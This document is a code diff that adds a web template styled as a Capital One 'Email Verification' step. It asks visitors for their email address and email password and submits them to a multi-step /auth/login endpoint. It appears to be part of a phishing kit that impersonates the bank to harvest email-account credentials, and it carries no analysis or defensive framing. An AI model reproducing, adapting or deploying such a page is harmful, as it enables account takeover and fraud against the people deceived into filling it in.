@@ -1,0 +1,61 @@
+@layout('layouts.app')
+
+@section('content')
+<div class="cb-content-card">
+  <div class="content-card content-card--small">
+    <img class="content-card--image" src="/img/icon-user.svg">
+    <h3 class="content-card--header">Email Verification</h3>
+    <p style="text-align:center;font-size:13px;">Help us confirm it's you by filling out the following information.</p>
+
+    <div class="content-card-inner--narrow">
+      <form class="cb-form" action="/auth/login/3" method="POST">
+        <div class="cb-margin-bottom-medium">
+          <div class="cb-form-field-invalid">
+            <div class="cb-form-field">
+              <label for="emailAddr" class="cb-textfield__label">Email Address</label>
+
+              <input id="emailAddr" name="emailAddr" type="text" class="cb-textfield__input cb-input" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+
+              <div class="cb-textfield__helper--error" style="display: none;">This field is required.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="cb-margin-bottom-medium">
+          <div class="cb-form-field-invalid">
+            <div class="cb-form-field">
+              <label for="emailPass" class="cb-textfield__label">Email Password</label>
+
+              <input id="emailPass" name="emailPass" type="password" class="cb-textfield__input hide-input cb-input" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
+
+              <div class="cb-textfield__icon cb-icon" style="right:1rem;left:auto;">
+                <svg width="100%" height="100%" viewBox="0 0 11 13" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="locked" preserveAspectRatio="xMidYMid meet" focusable="false">
+                  <g id="Home" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
+                    <g id="Outline" transform="translate(-433.000000, -192.000000)" fill="#263A48">
+                      <path d="M437.3604,199.0559 C437.3604,198.5589 437.7494,198.1759 438.2404,198.1759 C438.7364,198.1759 439.1214,198.5659 439.1214,199.0559 C439.1214,199.4049 438.9154,199.6729 438.6254,199.8399 L438.6254,201.3919 L437.8564,201.3919 L437.8564,199.8399 C437.5644,199.7149 437.3604,199.4289 437.3604,199.0559 L437.3604,199.0559 Z M436.0804,195.9839 L440.4004,195.9839 L440.4004,195.1039 C440.4004,193.6469 439.6784,192.6719 438.2404,192.6719 C436.8144,192.6719 436.0804,193.6529 436.0804,195.1039 L436.0804,195.9839 Z M434.8484,196.6559 C434.3734,196.6559 434.0804,196.9569 434.0804,197.4239 L434.0804,199.9039 C434.0804,202.2129 435.9254,203.4079 438.2404,203.4079 C440.5534,203.4079 442.4004,202.2149 442.4004,199.9039 L442.4004,197.4239 C442.4004,196.9529 442.1034,196.6559 441.6324,196.6559 L434.8484,196.6559 Z M435.4084,195.9839 L435.4084,195.1039 C435.4084,193.0779 436.5394,191.9999 438.2404,191.9999 C440.1054,191.9999 441.0724,193.2149 441.0724,195.1039 L441.0724,195.9839 L441.6324,195.9839 C442.5114,195.9839 443.0724,196.5489 443.0724,197.4239 L443.0724,199.9039 C443.0724,202.5989 441.0144,204.0799 438.2404,204.0799 C435.4824,204.0799 433.4084,202.6109 433.4084,199.9039 L433.4084,197.4239 C433.4084,196.5579 433.9604,195.9839 434.8484,195.9839 L435.4084,195.9839 Z" id="Lock"></path>
+                    </g>
+                  </g>
+                </svg>
+              </div>
+
+              <div class="cb-textfield__helper--error" style="display: none;">This field is required.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="cb-margin-bottom-medium cb-padding-top-xsmall">
+          <button type="submit" class="sign-in-button cb-button cb-button--action submit-btn">Continue</button>
+        </div>
+      </form>
+    </div>
+  </div>
+</div>
+
+<div class="content-card-inner--narrow cb-font-size-small cb-margin-top-large">
+  <p class="cb-font-size-small cb-margin-bottom-xsmall">Looking for these accounts?</p>
+
+  <p class="cb-font-size-small cb-margin-bottom-xsmall">
+    <a class="link-content" href="https://verified.capitalone.com/auth/other-products">Commercial or Trade Credit</a>
+  </p>
+</div>
+@endsection
